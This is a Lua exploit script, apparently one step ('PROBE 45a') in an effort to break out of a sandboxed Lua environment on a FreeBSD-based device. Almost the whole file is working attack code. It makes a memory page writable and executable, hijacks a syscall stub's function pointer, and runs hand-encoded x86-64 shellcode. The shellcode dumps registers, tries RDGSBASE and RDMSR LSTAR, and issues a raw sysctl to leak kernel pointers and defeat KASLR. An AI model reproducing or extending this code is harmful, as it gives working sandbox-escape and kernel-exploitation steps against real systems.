-- CRASH_CLASS: HIGH (native code execution, syscall from shellcode)
-- PROBE 45a: Native code execution for KASLR defeat
--
-- 44a CONFIRMED: mtypeprotect(RWX) + fn_addr redirect = native code execution.
-- But return values come through the ROP chain's epilogue, not from eax.
-- This probe writes shellcode that stores results to a MEMORY BUFFER
-- instead of relying on return values.
--
-- Strategy:
--   1. Write shellcode that reads kernel info via direct syscalls
--   2. Store results to a known heap address (not via return value)
--   3. Read the buffer back from Lua after execution
--
-- Shellcode targets:
--   a) kldstat via raw syscall (bypassing sandbox at syscall entry?)
--   b) sysctl with full register control
--   c) Read MSR (LSTAR = syscall handler address = kernel pointer)
--   d) Read GS base via RDGSBASE instruction (kernel curthread)

print("=== PROBE 45a: NATIVE EXEC KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_mtypeprotect = make_syscall(585)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) Allocate result buffer (RW, for shellcode to write to)
--------------------------------------------------------------------
print("")
print("=== A: RESULT BUFFER ===")
local result_buf = memory.alloc(0x1000)
for i = 0, 255 do safe_wd(result_buf + i*4, 0xDEADDEAD) end
local h_rb, l_rb = get_hi_lo(result_buf)
print(string.format("result_buf: %08X_%08X", h_rb, l_rb))

--------------------------------------------------------------------
-- B) Allocate executable page
--------------------------------------------------------------------
print("")
print("=== B: EXECUTABLE PAGE ===")
local page_size = 0x4000
local page
pcall(function()
    page = sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not page then print("FATAL: mmap failed"); return end
print("code page: " .. qw_hex(page))

-- Make it RWX
pcall(function()
    sc_mtypeprotect(uint64(page), uint64(page_size), uint64(7))
end)
print("mtypeprotect(RWX): done")

--------------------------------------------------------------------
-- C) Get fn_addr for redirection
--------------------------------------------------------------------
print("")
print("=== C: FN_ADDR ===")
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then print("FATAL: cannot parse fn_addr"); return end
local fn_ptr = uint64(fn_str)
local fn_orig = safe_rq(fn_ptr)
if not fn_orig then print("FATAL: cannot read fn_addr"); return end
print("fn_addr ptr: " .. fn_str)
print("fn_addr original: " .. qw_hex(fn_orig))

-- Helper: write bytes to page at offset
local function write_bytes(base, offset, bytes)
    for i, b in ipairs(bytes) do
        memory.write_byte(base + offset + i - 1, b)
    end
    return offset + #bytes
end

-- Helper: execute shellcode and read results
local function exec_shellcode(name, page_offset)
    print(string.format("  executing %s at page+0x%X...", name, page_offset))
    -- Clear result buffer
    for i = 0, 31 do safe_wd(result_buf + i*4, 0xDEADDEAD) end

    -- Redirect fn_addr
    safe_wq(fn_ptr, page + page_offset)

    -- Trigger execution
    local ok, ret = pcall(function() return sc_getpid() end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  call returned: ok=%s ret=%d", tostring(ok), rv))

    -- Restore fn_addr immediately
    safe_wq(fn_ptr, fn_orig)

    -- Read results from buffer
    local modified = 0
    for i = 0, 15 do
        local v = safe_rd(result_buf + i*4)
        if v and v ~= 0xDEADDEAD then
            modified = modified + 1
        end
    end
    return ok, modified
end

--------------------------------------------------------------------
-- D) SHELLCODE 1: Store RDI to result buffer
-- The ROP chain passes arg1 in RDI. Let's see what RDI contains
-- when our shellcode runs — it might be a useful value.
--
-- mov [result_buf], rdi    ; store rdi
-- mov [result_buf+8], rsi  ; store rsi
-- mov [result_buf+16], rdx ; store rdx
-- mov [result_buf+24], rcx ; store rcx
-- mov [result_buf+32], r8  ; store r8
-- mov [result_buf+40], r9  ; store r9
-- mov [result_buf+48], rsp ; store rsp (stack pointer!)
-- mov [result_buf+56], rbp ; store rbp
-- ret
--------------------------------------------------------------------
print("")
print("=== D: SHELLCODE 1 - DUMP REGISTERS ===")

local off = 0
-- We need to use movabs to load the 64-bit result_buf address
-- movabs rax, imm64: 48 B8 <8 bytes>
-- mov [rax], rdi:    48 89 38
-- lea rax, [rax+8]:  48 8D 40 08
-- mov [rax], rsi:    48 89 30
-- etc.

-- Encode result_buf address as 8 bytes (little-endian)
local addr_bytes = {}
addr_bytes[1] = l_rb % 256
addr_bytes[2] = math.floor(l_rb / 256) % 256
addr_bytes[3] = math.floor(l_rb / 65536) % 256
addr_bytes[4] = math.floor(l_rb / 16777216) % 256
addr_bytes[5] = h_rb % 256
addr_bytes[6] = math.floor(h_rb / 256) % 256
addr_bytes[7] = math.floor(h_rb / 65536) % 256
addr_bytes[8] = math.floor(h_rb / 16777216) % 256

-- movabs rax, result_buf
off = write_bytes(page, off, {0x48, 0xB8,
    addr_bytes[1], addr_bytes[2], addr_bytes[3], addr_bytes[4],
    addr_bytes[5], addr_bytes[6], addr_bytes[7], addr_bytes[8]})
-- mov [rax], rdi
off = write_bytes(page, off, {0x48, 0x89, 0x38})
-- mov [rax+8], rsi
off = write_bytes(page, off, {0x48, 0x89, 0x70, 0x08})
-- mov [rax+16], rdx
off = write_bytes(page, off, {0x48, 0x89, 0x50, 0x10})
-- mov [rax+24], rcx
off = write_bytes(page, off, {0x48, 0x89, 0x48, 0x18})
-- mov [rax+32], r8
off = write_bytes(page, off, {0x4C, 0x89, 0x40, 0x20})
-- mov [rax+40], r9
off = write_bytes(page, off, {0x4C, 0x89, 0x48, 0x28})
-- mov [rax+48], rsp
off = write_bytes(page, off, {0x48, 0x89, 0x60, 0x30})
-- mov [rax+56], rbp
off = write_bytes(page, off, {0x48, 0x89, 0x68, 0x38})
-- ret
off = write_bytes(page, off, {0xC3})

print(string.format("  shellcode size: %d bytes", off))

local ok1, mod1 = exec_shellcode("register dump", 0)
if ok1 then
    print("  register values:")
    for i = 0, 7 do
        local lo = safe_rd(result_buf + i*8) or 0
        local hi = safe_rd(result_buf + i*8 + 4) or 0
        local names = {"rdi", "rsi", "rdx", "rcx", "r8 ", "r9 ", "rsp", "rbp"}
        local marker = ""
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
            marker = " *** KERNEL POINTER ***"
        end
        print(string.format("    %s = %08X_%08X%s", names[i+1], hi, lo, marker))
    end
end

--------------------------------------------------------------------
-- E) SHELLCODE 2: Read GS base via RDGSBASE
-- RDGSBASE rax: F3 0F AE C8
-- If FSGSBASE is enabled, this reads kernel GS base directly.
-- If not enabled, it will #UD (SIGILL).
--------------------------------------------------------------------
print("")
print("=== E: SHELLCODE 2 - RDGSBASE ===")

off = 0x200
-- movabs r11, result_buf (use r11 to preserve other regs)
off = write_bytes(page, off, {0x49, 0xBB,
    addr_bytes[1], addr_bytes[2], addr_bytes[3], addr_bytes[4],
    addr_bytes[5], addr_bytes[6], addr_bytes[7], addr_bytes[8]})
-- rdgsbase rax: F3 0F AE C8
off = write_bytes(page, off, {0xF3, 0x0F, 0xAE, 0xC8})
-- mov [r11], rax
off = write_bytes(page, off, {0x49, 0x89, 0x03})
-- rdfsbase rax: F3 0F AE C0
off = write_bytes(page, off, {0xF3, 0x0F, 0xAE, 0xC0})
-- mov [r11+8], rax
off = write_bytes(page, off, {0x49, 0x89, 0x43, 0x08})
-- ret
off = write_bytes(page, off, {0xC3})

local ok2, mod2 = exec_shellcode("RDGSBASE", 0x200)
if ok2 and mod2 > 0 then
    local gs_lo = safe_rd(result_buf) or 0
    local gs_hi = safe_rd(result_buf + 4) or 0
    local fs_lo = safe_rd(result_buf + 8) or 0
    local fs_hi = safe_rd(result_buf + 12) or 0
    print(string.format("  GS base: %08X_%08X", gs_hi, gs_lo))
    print(string.format("  FS base: %08X_%08X", fs_hi, fs_lo))
    if gs_hi >= 0xFFFF8000 then
        print("  *** GS BASE IS A KERNEL POINTER! ***")
        print("  *** THIS IS LIKELY CURTHREAD - KASLR PARTIALLY DEFEATED ***")
    end
elseif ok2 then
    print("  executed but no data written (RDGSBASE may have returned 0)")
    local v0 = safe_rd(result_buf) or 0
    local v1 = safe_rd(result_buf + 4) or 0
    print(string.format("  buf[0]: %08X_%08X", v1, v0))
else
    print("  CRASHED - FSGSBASE not enabled (expected)")
end

--------------------------------------------------------------------
-- F) SHELLCODE 3: Read MSR via RDMSR (LSTAR = IA32_LSTAR = 0xC0000082)
-- LSTAR contains the syscall entry point address = kernel .text pointer
-- RDMSR requires ring 0 — will #GP if in ring 3
-- But worth trying since we're in a weird execution context
--------------------------------------------------------------------
print("")
print("=== F: SHELLCODE 3 - RDMSR LSTAR ===")

off = 0x400
-- movabs r11, result_buf
off = write_bytes(page, off, {0x49, 0xBB,
    addr_bytes[1], addr_bytes[2], addr_bytes[3], addr_bytes[4],
    addr_bytes[5], addr_bytes[6], addr_bytes[7], addr_bytes[8]})
-- mov ecx, 0xC0000082 (IA32_LSTAR)
off = write_bytes(page, off, {0xB9, 0x82, 0x00, 0x00, 0xC0})
-- rdmsr: 0F 32 (reads MSR[ecx] into edx:eax)
off = write_bytes(page, off, {0x0F, 0x32})
-- mov [r11], eax (low 32 bits)
off = write_bytes(page, off, {0x41, 0x89, 0x03})
-- mov [r11+4], edx (high 32 bits)
off = write_bytes(page, off, {0x41, 0x89, 0x53, 0x04})
-- ret
off = write_bytes(page, off, {0xC3})

local ok3, mod3 = exec_shellcode("RDMSR LSTAR", 0x400)
if ok3 and mod3 > 0 then
    local msr_lo = safe_rd(result_buf) or 0
    local msr_hi = safe_rd(result_buf + 4) or 0
    print(string.format("  LSTAR: %08X_%08X", msr_hi, msr_lo))
    if msr_hi >= 0xFFFF8000 then
        print("  *** LSTAR IS KERNEL SYSCALL ENTRY POINT ***")
        print("  *** KASLR DEFEATED - KERNEL .TEXT ADDRESS KNOWN ***")
    end
else
    print("  CRASHED or no data - RDMSR requires ring 0 (expected #GP)")
end

--------------------------------------------------------------------
-- G) SHELLCODE 4: Direct sysctl from native code with full control
-- This bypasses the ROP chain's argument marshalling entirely.
-- sysctl(kern.proc.pid) with our own buffer, read every byte.
--
-- mov eax, 202 (sysctl)
-- rdi = mib_buf, rsi = 4, rdx = outbuf, rcx = oldlenp, r8 = 0, r9 = 0
-- syscall
-- Store return value to result_buf
--------------------------------------------------------------------
print("")
print("=== G: SHELLCODE 4 - DIRECT SYSCTL ===")

-- Prepare sysctl args in memory
local mib_buf = memory.alloc(16)
safe_wd(mib_buf, 1)       -- CTL_KERN
safe_wd(mib_buf + 4, 14)  -- KERN_PROC
safe_wd(mib_buf + 8, 1)   -- KERN_PROC_PID
safe_wd(mib_buf + 12, pid)

local sysctl_out = memory.alloc(0x800)
for i = 0, 511 do safe_wd(sysctl_out + i*4, 0) end
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)

local h_mib, l_mib = get_hi_lo(mib_buf)
local h_out, l_out = get_hi_lo(sysctl_out)
local h_olp, l_olp = get_hi_lo(oldlenp)

-- Encode addresses
local function addr_to_bytes(hi, lo)
    return {
        lo % 256, math.floor(lo/256) % 256, math.floor(lo/65536) % 256, math.floor(lo/16777216) % 256,
        hi % 256, math.floor(hi/256) % 256, math.floor(hi/65536) % 256, math.floor(hi/16777216) % 256
    }
end

local mib_bytes = addr_to_bytes(h_mib, l_mib)
local out_bytes = addr_to_bytes(h_out, l_out)
local olp_bytes = addr_to_bytes(h_olp, l_olp)

off = 0x600
-- movabs rdi, mib_buf
off = write_bytes(page, off, {0x48, 0xBF,
    mib_bytes[1], mib_bytes[2], mib_bytes[3], mib_bytes[4],
    mib_bytes[5], mib_bytes[6], mib_bytes[7], mib_bytes[8]})
-- mov esi, 4 (miblen)
off = write_bytes(page, off, {0xBE, 0x04, 0x00, 0x00, 0x00})
-- movabs rdx, sysctl_out
off = write_bytes(page, off, {0x48, 0xBA,
    out_bytes[1], out_bytes[2], out_bytes[3], out_bytes[4],
    out_bytes[5], out_bytes[6], out_bytes[7], out_bytes[8]})
-- movabs r10, oldlenp (syscall ABI uses r10 instead of rcx)
off = write_bytes(page, off, {0x49, 0xBA,
    olp_bytes[1], olp_bytes[2], olp_bytes[3], olp_bytes[4],
    olp_bytes[5], olp_bytes[6], olp_bytes[7], olp_bytes[8]})
-- xor r8d, r8d (newp = NULL)
off = write_bytes(page, off, {0x45, 0x31, 0xC0})
-- xor r9d, r9d (newlen = 0)
off = write_bytes(page, off, {0x45, 0x31, 0xC9})
-- mov eax, 202 (sysctl)
off = write_bytes(page, off, {0xB8, 0xCA, 0x00, 0x00, 0x00})
-- syscall
off = write_bytes(page, off, {0x0F, 0x05})
-- movabs r11, result_buf
off = write_bytes(page, off, {0x49, 0xBB,
    addr_bytes[1], addr_bytes[2], addr_bytes[3], addr_bytes[4],
    addr_bytes[5], addr_bytes[6], addr_bytes[7], addr_bytes[8]})
-- mov [r11], rax (return value)
off = write_bytes(page, off, {0x49, 0x89, 0x03})
-- ret
off = write_bytes(page, off, {0xC3})

print(string.format("  shellcode size: %d bytes", off - 0x600))
print(string.format("  mib_buf: %08X_%08X", h_mib, l_mib))
print(string.format("  sysctl_out: %08X_%08X", h_out, l_out))

local ok4, mod4 = exec_shellcode("direct sysctl", 0x600)
if ok4 then
    local ret_lo = safe_rd(result_buf) or 0
    local ret_hi = safe_rd(result_buf + 4) or 0
    print(string.format("  sysctl ret: %08X_%08X", ret_hi, ret_lo))

    -- Check actual returned length
    local actual_len = safe_rd(oldlenp) or 0
    print(string.format("  actual_len: %d", actual_len))

    if ret_lo == 0 and ret_hi == 0 and actual_len > 0 then
        print("  sysctl SUCCEEDED from native code!")
        -- Scan every qword of the output for kernel pointers
        local found_kptr = false
        for i = 0, math.min(actual_len, 0x800) - 8, 8 do
            local lo = safe_rd(sysctl_out + i) or 0
            local hi = safe_rd(sysctl_out + i + 4) or 0
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                print(string.format("  *** KPTR at +%03X: %08X_%08X ***", i, hi, lo))
                found_kptr = true
            end
        end
        if not found_kptr then
            print("  no kernel pointers in sysctl output")
        end

        -- Print some interesting offsets from kinfo_proc
        print("  kinfo_proc selected fields:")
        for _, info in ipairs({
            {off=0x000, name="ki_structsize"},
            {off=0x008, name="ki_paddr (proc ptr)"},
            {off=0x010, name="ki_addr (user ptr)"},
            {off=0x020, name="ki_tracep"},
            {off=0x028, name="ki_textvp"},
            {off=0x030, name="ki_fd"},
            {off=0x038, name="ki_vmspace"},
            {off=0x058, name="ki_wchan"},
            {off=0x060, name="ki_flag"},
        }) do
            local lo = safe_rd(sysctl_out + info.off) or 0
            local hi = safe_rd(sysctl_out + info.off + 4) or 0
            local marker = ""
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then marker = " ***KPTR***" end
            print(string.format("    +%03X %s: %08X_%08X%s", info.off, info.name, hi, lo, marker))
        end
    end
else
    print("  CRASHED during direct sysctl")
end

--------------------------------------------------------------------
-- H) Cleanup
--------------------------------------------------------------------
print("")
print("=== H: CLEANUP ===")
safe_wq(fn_ptr, fn_orig)
local fn_final = safe_rq(fn_ptr)
print("fn_addr restored: " .. qw_hex(fn_final))
pcall(function() sc_munmap(page, uint64(page_size)) end)

print("")
print("=== PROBE 45a COMPLETE ===")
